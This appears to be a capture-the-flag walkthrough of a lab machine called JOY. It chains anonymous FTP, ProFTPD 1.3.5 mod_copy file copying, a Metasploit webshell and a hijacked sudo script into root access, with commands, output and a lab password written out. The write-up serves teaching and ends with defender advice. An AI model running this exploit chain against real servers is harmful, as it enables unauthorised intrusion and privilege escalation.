01 Reconnaissance

First thing I do on any target - map the surface. I'm not rushing toward exploitation; I want a picture of what this machine is exposing before I touch anything. My mindset here: every open port is a decision someone made. Port 21 with anonymous login is not an accident - it's a gift.

⚡ Attacker Thinking
With this many ports open, the attack surface is wide - but not all surfaces are equal. I'm immediately drawn to FTP on 21. Anonymous login is enabled, which means someone configured this deliberately, or forgot to lock it down. Either way, I can read the filesystem without credentials. That changes everything.

02 Enumeration

Anonymous FTP access means I can browse the exposed filesystem - no credentials required. The layout immediately tells a story: /download is read-only, /upload is read-write. This asymmetry matters - it will become a pivot point later in the escalation chain.

ftp - anonymous enumeration
ownuh@kali:~$ ftp 192.168.1.104
Name: anonymous Password: (blank)
230 Login successful.
 
ftp> ls

ftp> cd download
ftp> ls
-rw-r--r-- directory
 
ftp> get directory

The file named directory is interesting. Not a script, not a binary - just a plain text listing of the server's filesystem structure. Someone left a map. Reading it carefully, I find a reference to Patrick's home directory and a file called version_control. That name is suspicious. Version control files often expose software versions, paths, and deployment details.

⚡ Attacker Thinking
I can't read /home/patrick/version_control directly from FTP since it's outside the FTP root. But here's where I get creative: ProFTPD 1.3.5 supports SITE CPFR / SITE CPTO - server-side file copy commands. If I can copy Patrick's file into /home/ftp/upload/ (which I can write to), I can retrieve it via FTP. The server becomes my exfiltration tool against itself.
telnet → ProFTPD SITE CPFR/CPTO - server-side file copy
ownuh@kali:~$ telnet 192.168.1.104 21
220 ProFTPD 1.3.5 Server ready.
 
telnet> site cpfr /home/patrick/version_control
350 File or directory exists, ready for destination name
 
telnet> site cpto /home/ftp/upload/version_control
250 Copy successful

Now I retrieve the copied file via FTP. The version_control file reveals two critical pieces of intelligence: the exact ProFTPD version running, and the webroot path - /var/www/tryingharderisjoy. That webroot path is my entry point for the exploit stage.

03 Exploitation

ProFTPD 1.3.5 with mod_copy enabled is a well-documented vulnerability. The mod_copy module allows unauthenticated file copy operations - meaning I can write a PHP webshell anywhere the FTP user has access to, including the webroot. Combined with the webroot path I extracted, this is a clean path to RCE.

I'll use Metasploit's proftpd_modcopy_exec module which automates this: it copies a PHP payload into the webroot, then triggers it via HTTP to pop a shell.

04 Privilege Escalation

I switch to Patrick and immediately check his sudo rights. This is always my first post-access check - sudo misconfigurations are one of the most common and most exploitable PrivEsc paths on Linux systems.

sudo enumeration as patrick
www-data@JOY:/$ su patrick
Password: apollo098765
patrick@JOY:~$
 
patrick@JOY:~$ sudo -l
 
User patrick may run the following commands:
(root) NOPASSWD: /home/patrick/script/test

Patrick can execute /home/patrick/script/test as root - no password required. The script itself does nothing useful. But here's the critical question I ask: can I replace it -

checking write permissions
patrick@JOY:~$ ls -la /home/patrick/script/
drwxr-xr-x 2 root root 4096 script/
-rwxr-xr-x 1 root root 22 test
 
Directory owned by root - no direct write access.

The /script/ directory is root-owned and not writable by Patrick. Direct replacement is blocked. But I already know the FTP service allows authenticated SITE CPFR/CPTO operations. Since the FTP server runs with elevated privileges, I can use it to copy files anywhere on the filesystem - including into Patrick's script directory. The FTP service becomes my privilege escalation primitive.

craft payload → stage via FTP upload → deploy via CPFR/CPTO
# Step 1: craft the malicious test script
ownuh@kali:~$ echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test
 
# Step 2: upload it into FTP's writable /upload dir
ownuh@kali:~$ ftp 192.168.1.104
ftp> cd upload
ftp> put test
226 Transfer complete.
 
# Step 3: use ProFTPD SITE CPTO to move it into the script dir
ownuh@kali:~$ telnet 192.168.1.104 21
telnet> site cpfr /home/ftp/upload/test
350 File exists, ready for destination name
telnet> site cpto /home/patrick/script/test
250 Copy successful
⚡ Attacker Thinking
This is the elegant part: I didn't need a kernel exploit or a 0-day. I leveraged the same misconfiguration twice - once to read files, once to write them. The attacker's principle: find the one broken primitive and chain it as far as it will take you. Here, SITE CPFR/CPTO was that primitive.

05 Key Takeaways

This box teaches one important lesson clearly: a single misconfiguration, chained creatively, can compromise an entire system. The ProFTPD mod_copy misconfiguration wasn't exploited once - it was the thread that ran through every phase: enumeration, lateral file access, exploitation, and privilege escalation.

Misconfiguration #1 Anonymous FTP - exposed filesystem readable without credentials
Misconfiguration #2 SITE CPFR/CPTO - unauthenticated server-side file copy (mod_copy)
Misconfiguration #3 Plaintext credentials stored in /ossec/ directory
Misconfiguration #4 Sudo NOPASSWD on a user-writable (via FTP pivot) script
Defender Recommendation Disable mod_copy in ProFTPD; restrict anonymous FTP; never store credentials in filesystem; audit sudo rules for script paths
Final Thought
Real attackers don't need to break encryption or exploit memory corruption to own a box. Most breaches happen exactly like this: a forgotten config, a trusted tool misused, a file copied somewhere it shouldn't be. Find me before they find you.
